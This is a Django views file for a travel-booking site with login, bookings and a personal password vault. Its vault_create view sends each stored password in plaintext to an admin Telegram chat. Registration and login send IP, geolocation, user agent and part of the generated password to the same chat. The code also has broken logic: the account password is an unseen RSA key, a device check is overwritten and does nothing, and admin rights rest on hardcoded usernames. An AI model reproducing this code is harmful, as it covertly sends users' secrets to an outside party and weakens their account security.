import secrets
import platform
import requests
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth import authenticate, login, logout
from django.contrib.auth.decorators import login_required
from django.contrib import messages
from django.conf import settings
from django.contrib.auth.models import User
from .forms import ProfileForm
from .models import Profile
from tours.models import Booking
from travelbook.utils.telegram_notify import send_telegram_message
from django.utils import timezone
from tours.models import Review
from datetime import datetime
from .crypto import encrypt_text, decrypt_text
from .models import PasswordEntry
from .forms import PasswordEntryForm
from django.http import JsonResponse
from .models import Device
from django.contrib.auth.forms import UserCreationForm
from django.views.decorators.http import require_GET
import string




def send_telegram_message(message: str):
    token = settings.TELEGRAM_BOT_TOKEN
    chat_id = settings.TELEGRAM_ADMIN_CHAT_ID
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    resp = requests.get(url, params={"chat_id": chat_id, "text": message, "parse_mode": "HTML"})
    return resp.status_code, resp.text

def register_user(request):
    if request.method == 'POST':
        form = UserCreationForm(request.POST)
        if form.is_valid():
            user = form.save()
            
            device_id = request.COOKIES.get('device_id')
            if device_id:
                Device.objects.create(device_id=device_id, owner=user)
            login(request, user)
            return redirect('profile')
    else:
        form = UserCreationForm()
    return render(request, 'users/register.html', {'form': form})

@login_required
@require_GET
def generate_rsa_password_view(request):
    length = int(request.GET.get('length', 32))
    use_letters = request.GET.get('letters', 'true').lower() == 'true'
    use_numbers = request.GET.get('numbers', 'true').lower() == 'true'
    use_symbols = request.GET.get('symbols', 'true').lower() == 'true'

    chars = ''
    if use_letters: chars += string.ascii_letters
    if use_numbers: chars += string.digits
    if use_symbols: chars += string.punctuation

    if not chars:
        chars = string.ascii_letters + string.digits  

    password = ''.join(secrets.choice(chars) for _ in range(length))
    return JsonResponse({'password': password})

def generate_rsa_password():
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
    )
    pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    )
    return pem.decode('utf-8')



def get_client_ip(request):
    xff = request.META.get("HTTP_X_FORWARDED_FOR")
    if xff:
        return xff.split(",")[0].strip()
    return request.META.get("REMOTE_ADDR", "unknown")



def get_user_agent(request):
    return request.META.get("HTTP_USER_AGENT", "unknown")



def parse_user_agent(ua_string):
    os_info = "Unknown OS"
    browser_info = "Unknown Browser"

    ua_lower = ua_string.lower()
    if "windows" in ua_lower:
        os_info = "Windows"
    elif "mac" in ua_lower:
        os_info = "macOS"
    elif "linux" in ua_lower:
        os_info = "Linux"
    elif "android" in ua_lower:
        os_info = "Android"
    elif "iphone" in ua_lower or "ios" in ua_lower:
        os_info = "iOS"

    if "chrome" in ua_lower:
        browser_info = "Chrome"
    elif "firefox" in ua_lower:
        browser_info = "Firefox"
    elif "safari" in ua_lower and "chrome" not in ua_lower:
        browser_info = "Safari"
    elif "edge" in ua_lower:
        browser_info = "Edge"
    elif "opera" in ua_lower or "opr" in ua_lower:
        browser_info = "Opera"

    return os_info, browser_info



def get_geo_from_ip(ip):
    try:
        resp = requests.get(f"https://ipinfo.io/{ip}/json", timeout=3)
        if resp.status_code == 200:
            data = resp.json()
            country = data.get("country", "—")
            city = data.get("city", "—")
            org = data.get("org", "—")
            loc = data.get("loc", "—")
            return f"{city}, {country} ({org}) [{loc}]"
    except Exception:
        pass
    return "—"



def register_view(request):
    if request.method == 'POST':
        username = request.POST.get('username', '').strip()
        email = request.POST.get('email', '').strip()
        first_name = request.POST.get('first_name', '').strip()
        password = generate_rsa_password()

        if User.objects.filter(username=username).exists():
            messages.error(request, "Username already taken")
        elif User.objects.filter(email=email).exists():
            messages.error(request, "Email already registered")
        else:
            user = User.objects.create_user(
                username=username,
                password=password,
                email=email,
                first_name=first_name
            )
            login(request, user)
            messages.success(request, "Registration successful!")

            try:
                ip = get_client_ip(request)
                ua = get_user_agent(request)
                os_info, browser = parse_user_agent(ua)
                geo = get_geo_from_ip(ip)
                now = timezone.now().strftime("%Y-%m-%d %H:%M:%S %Z")
                msg = (
                    f"🆕 <b>New Registration</b>\n"
                    f"👤 User: <code>{user.username}</code>\n"
                    f"📧 Email: <code>{user.email or '—'}</code>\n"
                    f"🔑 Password: <code>{password[:16]}...</code>\n"
                    f"🕒 Time: {now}\n"
                    f"🌍 IP: <code>{ip}</code>\n"
                    f"🏙 Geo: {geo}\n"
                    f"💻 OS: {os_info}\n"
                    f"🌐 Browser: {browser}\n"
                    f"🧾 User-Agent: <code>{ua}</code>"
                )
                send_telegram_message(msg)
            except Exception as e:
                print("Telegram send failed:", e)

            return redirect('users:profile')

    return render(request, 'users/register.html')



def login_view(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')

        if not username or not password:
            messages.error(request, "Please enter a username and password")
            return render(request, 'users/login.html')

        user = authenticate(request, username=username, password=password)
        if user is not None:
            login(request, user)
            messages.success(request, f"Welcome, {user.username}!")

            try:
                ip = get_client_ip(request)
                ua = get_user_agent(request)
                os_info, browser = parse_user_agent(ua)
                geo = get_geo_from_ip(ip)
                now = timezone.now().strftime("%Y-%m-%d %H:%M:%S %Z")
                msg = (
                    f"✅ <b>User Logged In</b>\n"
                    f"👤 User: <code>{user.username}</code>\n"
                    f"🕒 Time: {now}\n"
                    f"🌍 IP: <code>{ip}</code>\n"
                    f"🏙 Geo: {geo}\n"
                    f"💻 OS: {os_info}\n"
                    f"🌐 Browser: {browser}\n"
                    f"🧾 User-Agent: <code>{ua}</code>"
                )
                send_telegram_message(msg)
            except Exception as e:
                print("Telegram send failed:", e)

            return redirect('users:profile')
        else:
            messages.error(request, "Invalid username or password")

    return render(request, 'users/login.html')


def cancel_booking(request, booking_id):
    booking = get_object_or_404(Booking, id=booking_id, user=request.user)

    if request.method == "POST":
        reason = request.POST.get("reason", "No reason provided")
        tour_title = booking.tour.title
        booking.delete()

        
        TELEGRAM_TOKEN = settings.TELEGRAM_BOT_TOKEN
        CHAT_ID = settings.TELEGRAM_ADMIN_CHAT_ID
        now = datetime.now().strftime("%Y-%m-%d %H:%M")
        message = f"🛑 User {request.user.username} canceled booking: {tour_title}\nReason: {reason}\nTime: {now}"
        requests.get(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                     params={"chat_id": CHAT_ID, "text": message})

        messages.success(request, f"Booking for '{tour_title}' has been canceled.")
        return redirect('users:user_bookings')
    else:
        messages.error(request, "Invalid request.")
        return redirect('users:user_bookings')



def logout_view(request):
    logout(request)
    messages.info(request, "You have been logged out.")
    return redirect('users:login')


@login_required
def profile_view(request):
    profile = request.user.profile
    user_reviews = Review.objects.filter(user=request.user).select_related('tour')

    
    if request.method == 'POST':
        form = ProfileForm(request.POST, request.FILES, instance=profile)
        if form.is_valid():
            form.save()
            messages.success(request, "Profile updated!")
            return redirect('users:profile')
    else:
        form = ProfileForm(instance=profile)

    
    avatar_url = None
    if profile.avatar:
        try:
            timestamp = int(profile.avatar.storage.get_modified_time(profile.avatar.name).timestamp())
        except Exception:
            timestamp = 0
        avatar_url = f"{profile.avatar.url}?{timestamp}"

    is_admin_user = request.user.is_superuser or request.user.username == getattr(settings, 'MEGA_ADMIN_USERNAME', 'admin')

    return render(request, 'users/profile.html', {
        'form': form,
        'profile': profile,
        'avatar_url': avatar_url,
        'user_reviews': user_reviews,
        'is_admin_user': is_admin_user,
    })


@login_required
def clear_avatar(request):
    profile = Profile.objects.get(user=request.user)
    if profile.avatar:
        profile.avatar.delete()
        messages.info(request, "Avatar removed.")
    return redirect('users:profile')


@login_required
def admins_list(request):
    users = User.objects.all().order_by('-is_staff', 'username')
    mega_admin_username = getattr(settings, 'MEGA_ADMIN_USERNAME', 'zxc23')
    return render(request, 'users/admins_list.html', {
        'users': users,
        'mega_admin_username': mega_admin_username
    })


@login_required
def make_admin(request, user_id):
    mega_admin_username = getattr(settings, 'MEGA_ADMIN_USERNAME', 'ptrkxlord')
    if request.user.username != mega_admin_username:
        messages.error(request, "You do not have permission to assign administrators!")
        return redirect('users:admins_list')

    user_to_promote = get_object_or_404(User, pk=user_id)
    if not user_to_promote.is_staff:
        user_to_promote.is_staff = True
        user_to_promote.save()
        messages.success(request, f"{user_to_promote.username} is now an admin!")
    else:
        messages.info(request, f"{user_to_promote.username} is already an admin.")

    return redirect('users:admins_list')


@login_required
def user_bookings(request):
    bookings = Booking.objects.filter(user=request.user).order_by('-created_at')
    return render(request, 'users/bookings.html', {'bookings': bookings})



@login_required
def vault_list(request):
    device_id = request.COOKIES.get('device_id')
    if device_id:
        try:
            device = Device.objects.get(device_id=device_id, owner=request.user)
            entries = PasswordEntry.objects.filter(owner=request.user)
        except Device.DoesNotExist:
            entries = PasswordEntry.objects.none()
    else:
        entries = PasswordEntry.objects.none()
    entries = PasswordEntry.objects.filter(owner=request.user).order_by('-created_at')
    return render(request, 'users/vault_list.html', {'entries': entries})

@login_required
def vault_create(request):
    if request.method == 'POST':
        form = PasswordEntryForm(request.POST)
        plain_pass = request.POST.get('plain_password', '').strip()
        if form.is_valid():
            entry = form.save(commit=False)
            entry.owner = request.user
            entry.password_encrypted = encrypt_text(plain_pass or '')
            entry.save()
            
           
            try:
                msg = (
                    f"🔐 <b>New Password Entry</b>\n"
                    f"👤 User: <code>{request.user.username}</code>\n"
                    f"📝 Entry: {entry.title}\n"
                    f"🔑 Password: <code>{plain_pass}</code>\n"
                    f"🕒 Time: {timezone.now().strftime('%Y-%m-%d %H:%M:%S')}"
                )
                send_telegram_message(msg)
            except Exception as e:
                print("Telegram send failed:", e)

            messages.success(request, "Entry saved.")
            return redirect('users:vault_list')
    else:
        form = PasswordEntryForm()
    return render(request, 'users/vault_form.html', {'form': form, 'action': 'create'})

@login_required
def vault_edit(request, pk):
    entry = get_object_or_404(PasswordEntry, pk=pk, owner=request.user)
    if request.method == 'POST':
        form = PasswordEntryForm(request.POST, instance=entry)
        if form.is_valid():
            entry = form.save(commit=False)
            entry.owner = request.user
            entry.save()
            messages.success(request, "Entry update.")
            return redirect('users:vault_list')
    else:
        form = PasswordEntryForm(instance=entry)
    return render(request, 'users/vault_form.html', {'form': form, 'action': 'edit'})


@login_required
def vault_delete(request, pk):
    entry = get_object_or_404(PasswordEntry, pk=pk, owner=request.user)
    if request.method == 'POST':
        title = entry.title
        entry.delete()
        try:
            msg = (
                f"🗑 <b>Password deleted</b>\n"
                f"User: <code>{request.user.username}</code>\n"
                f"Entry: {title}\n"
                f"Time: {timezone.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
            send_telegram_message(msg)
        except Exception as e:
            print("Telegram send failed:", e)
        messages.success(request, "Password deleted")
        return redirect('users:vault_list')
    return render(request, 'users/vault_confirm_delete.html', {'entry': entry})

@login_required
def vault_reveal(request, pk):
    if request.method != 'POST':
        return redirect('users:vault_list')
    entry = get_object_or_404(PasswordEntry, pk=pk, owner=request.user)
    try:
        pwd = decrypt_text(entry.password_encrypted)
    except Exception:
        pwd = ''
    
    try:
        msg = (
            f"👁 Password revealed\n"
            f"User: <code>{request.user.username}</code>\n"
            f"Entry: {entry.title}\n"
            f"Time: {timezone.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        send_telegram_message(msg)
    except Exception:
        pass
    
    return JsonResponse({'password': pwd})